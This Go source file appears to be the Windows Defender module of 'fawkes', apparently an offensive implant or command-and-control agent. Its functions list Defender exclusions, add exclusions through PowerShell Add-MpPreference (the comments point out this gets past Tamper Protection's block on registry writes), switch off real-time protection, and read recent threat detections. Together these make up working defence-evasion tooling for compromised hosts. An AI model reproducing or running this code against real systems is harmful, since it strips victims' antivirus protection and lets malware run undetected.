//go:build windows

package commands

import (
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

// defenderExclusions reads all Defender exclusions from the registry.
func defenderExclusions() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("Windows Defender Exclusions:\n\n")

	exclusionTypes := []struct {
		name    string
		regPath string
	}{
		{"Path Exclusions", `SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths`},
		{"Process Exclusions", `SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes`},
		{"Extension Exclusions", `SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions`},
	}

	totalExclusions := 0
	for _, et := range exclusionTypes {
		sb.WriteString(fmt.Sprintf("  %s:\n", et.name))
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, et.regPath, registry.READ)
		if err != nil {
			sb.WriteString("    (not accessible or empty)\n")
			continue
		}

		valueNames, err := key.ReadValueNames(-1)
		key.Close()
		if err != nil || len(valueNames) == 0 {
			sb.WriteString("    (none)\n")
			continue
		}

		for _, name := range valueNames {
			sb.WriteString(fmt.Sprintf("    - %s\n", name))
			totalExclusions++
		}
	}

	// Also check policy-based exclusions
	sb.WriteString("\n  Policy-Based Exclusions:\n")
	policyPaths := []struct {
		name    string
		regPath string
	}{
		{"Path", `SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths`},
		{"Process", `SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes`},
		{"Extension", `SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions`},
	}

	for _, pp := range policyPaths {
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, pp.regPath, registry.READ)
		if err != nil {
			continue
		}
		valueNames, err := key.ReadValueNames(-1)
		key.Close()
		if err != nil || len(valueNames) == 0 {
			continue
		}
		sb.WriteString(fmt.Sprintf("    %s:\n", pp.name))
		for _, name := range valueNames {
			sb.WriteString(fmt.Sprintf("      - %s\n", name))
			totalExclusions++
		}
	}

	sb.WriteString(fmt.Sprintf("\n  Total: %d exclusions\n", totalExclusions))

	return successResult(sb.String())
}

// defenderAddExclusion adds a path, process, or extension exclusion.
// Uses PowerShell Add-MpPreference cmdlet which works with Tamper Protection.
func defenderAddExclusion(args defenderArgs) structs.CommandResult {
	if args.Value == "" {
		return errorResult("Error: value is required (path, process name, or extension)")
	}

	exType := strings.ToLower(args.Type)
	if exType == "" {
		exType = "path"
	}

	var paramName string
	switch exType {
	case "path":
		paramName = "ExclusionPath"
	case "process":
		paramName = "ExclusionProcess"
	case "extension":
		paramName = "ExclusionExtension"
	default:
		return errorf("Unknown exclusion type: %s\nAvailable: path, process, extension", exType)
	}

	// Use PowerShell Add-MpPreference — works through official Defender API
	// even when Tamper Protection blocks direct registry writes
	psCmd := fmt.Sprintf("Add-MpPreference -%s '%s'", paramName, strings.ReplaceAll(args.Value, "'", "''"))
	output, err := defenderRunPowerShell(psCmd)
	if err != nil {
		return errorf("Error adding exclusion: %v\n%s\nRequires administrator privileges.", err, output)
	}

	return successf("Added Defender %s exclusion: %s", exType, args.Value)
}

// defenderRemoveExclusion removes a path, process, or extension exclusion.
// Uses PowerShell Remove-MpPreference cmdlet which works with Tamper Protection.
func defenderRemoveExclusion(args defenderArgs) structs.CommandResult {
	if args.Value == "" {
		return errorResult("Error: value is required (path, process name, or extension)")
	}

	exType := strings.ToLower(args.Type)
	if exType == "" {
		exType = "path"
	}

	var paramName string
	switch exType {
	case "path":
		paramName = "ExclusionPath"
	case "process":
		paramName = "ExclusionProcess"
	case "extension":
		paramName = "ExclusionExtension"
	default:
		return errorf("Unknown exclusion type: %s\nAvailable: path, process, extension", exType)
	}

	// Use PowerShell Remove-MpPreference — works through official Defender API
	psCmd := fmt.Sprintf("Remove-MpPreference -%s '%s'", paramName, strings.ReplaceAll(args.Value, "'", "''"))
	output, err := defenderRunPowerShell(psCmd)
	if err != nil {
		return errorf("Error removing exclusion: %v\n%s\nRequires administrator privileges.", err, output)
	}

	return successf("Removed Defender %s exclusion: %s", exType, args.Value)
}

// defenderSetRealtime enables or disables Windows Defender real-time protection.
// Uses Set-MpPreference via PowerShell. Requires administrator privileges.
// May fail if Tamper Protection is enabled (Windows 10 1903+).
func defenderSetRealtime(enable bool) structs.CommandResult {
	var psCmd string
	if enable {
		psCmd = "Set-MpPreference -DisableRealtimeMonitoring $false"
	} else {
		psCmd = "Set-MpPreference -DisableRealtimeMonitoring $true"
	}

	output, err := defenderRunPowerShell(psCmd)
	if err != nil {
		errMsg := fmt.Sprintf("Error: %v", err)
		if output != "" {
			errMsg += fmt.Sprintf("\nOutput: %s", output)
		}
		if strings.Contains(errMsg, "denied") || strings.Contains(errMsg, "Tamper") {
			errMsg += "\nNote: Tamper Protection may be blocking this change. Disable it via Windows Security UI or Group Policy first."
		}
		return errorResult(errMsg)
	}

	action := "Enabled"
	if !enable {
		action = "Disabled"
	}
	result := fmt.Sprintf("%s Windows Defender real-time protection", action)
	if output != "" {
		result += fmt.Sprintf("\n%s", output)
	}

	return successResult(result)
}

// defenderRunPowerShell runs a PowerShell command for Defender management.
func defenderRunPowerShell(psCmd string) (string, error) {
	args := BuildPSArgs(psCmd, InternalPSOptions())
	output, err := execCmdTimeout("powershell.exe", args...)

	return strings.TrimSpace(string(output)), err
}

// defenderThreats queries recent threat detections.
func defenderThreats() structs.CommandResult {
	result, err := defenderWMIQueryWithTimeout("SELECT * FROM MSFT_MpThreatDetection", 15*time.Second)
	if err != nil {
		return errorf("Error querying threats: %v", err)
	}

	if result == "(no results)" {
		return successResult("No recent threat detections found.")
	}

	return successf("Recent Threat Detections:\n\n%s", result)
}
